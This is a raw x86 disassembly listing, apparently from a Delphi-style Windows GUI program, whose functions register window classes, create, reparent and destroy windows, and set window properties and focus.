mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4139c8
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_4407f4
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4413ec
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413a44
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4139c8
mov edx eax
mov ecx ebx
mov eax edi
call sub_440768
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_440da4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_441428
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4413ec
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4413ec
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_440df8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_440da4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440ed7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_440c34
pop ecx
push ebp
mov al 0x2
call sub_440c34
pop ecx
push ebp
mov al 0x3
call sub_440c34
pop ecx
push ebp
mov al 0x4
call sub_440c34
pop ecx
push ebp
mov al 0x5
call sub_440c34
pop ecx
push ebp
mov al 0x6
call sub_440c34
pop ecx
push ebp
xor eax eax
call sub_440c34
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403468
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_440efc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440f90
xor eax eax
push ebp
push sub_440f83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_440fc0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441085
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d8c8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_441428
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44108c
mov eax [ ebp - 0xc ]
call sub_40326c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41386c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43d634
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4139c8
xor ecx ecx
mov edx 0xb03e
call sub_43f0c4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_441094
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441428
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_440f90
xor edx edx
push ebp
push sub_44117b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_441428
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41386c
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4139c8
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43d3d8
mov dl 0x4
call sub_43d3d8
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4138b8
sub_4411e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_455b0c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_459928
sub_441208
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43c7b8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43c7b8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43c7b8
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_441254
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43c7e0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43c7e0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43c7e0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44129c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403468
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43f0c4
mov edx ebx
mov eax edi
call sub_441208
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43f0c4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43f0c4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax edi
call sub_4449fc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43f0c4
mov eax edi
call sub_441dec
jmp r-xdata
mov edx ebx
mov eax edi
call sub_440efc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441370
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43f0c4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_4411e8
mov eax ebp
call sub_441c50
jmp r-xdata
mov edx ebx
mov eax esi
call sub_441254
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43f0c4
mov eax esi
call sub_440fb8
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e30c
sub_4413ec
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4139c8
mov edx edi
mov eax ebp
call sub_4139c8
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_441448
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_441428
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4413ec
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_441488
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_441448
add esp 0x10
retn
sub_4414b0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44151c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43e520
test al al
je r-xdata
mov eax ebx
call sub_43e550
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403468
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403468
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403468
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_441584
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4416a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c88
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44151c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4446f8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404220
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4416a9
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_4416b0
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_441871
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43ac64
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43ac64
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c824
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c824
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408704
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_444a08
push 0x1
mov eax [ esi + 0x68 ]
call sub_41c6a8
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43f0c4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4446f8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441878
lea eax [ ebp - 0xc0 ]
call sub_403fbc
retn
mov eax esi
mov si 0xffee
call sub_403468
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_441880
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4069c4
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_4418c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417810
mov eax esi
call sub_417760
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417760
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417818
pop esi
pop ebx
retn
sub_4418f8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41905c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_418fe8
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_418fe8
mov eax esi
call sub_419064
add esp 0x10
pop esi
pop ebx
retn
sub_441960
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44194c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4139c8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4139c8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_441a38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43f3fc
mov eax [ ebp - 0x8 ]
push eax
push sub_4418c0
mov eax [ ebp - 0x8 ]
push eax
push sub_4418f8
push ebp
call sub_441960
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441a94
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43de38
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4086b8
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4086cc
mov ecx eax
mov edx edi
mov eax ebx
call sub_43de48
mov eax r-xdata
call sub_4086d8
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43c8ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_441aec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_441b39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441b40
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c824
sub_441b50
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413a24
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4139c8
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_441b98
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_441b50
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4413ec
call sub_43d518
inc edi
dec esi
jne r-xdata
sub_441c34
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_441c50
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4139c8
call sub_441c50
inc edi
dec esi
jne r-xdata
sub_441cb0
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403468
mov ebx eax
mov eax edi
call sub_441c50
mov eax edi
call sub_441dec
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_441cf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_441dc6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43f0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4139c8
call sub_441cf0
inc esi
dec ebx
jne r-xdata
sub_441dec
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441cf0
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_441e2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_441c50
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_441dec
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4069ac
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43f0c4
jmp r-xdata
sub_441eb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441f0c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_441efb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
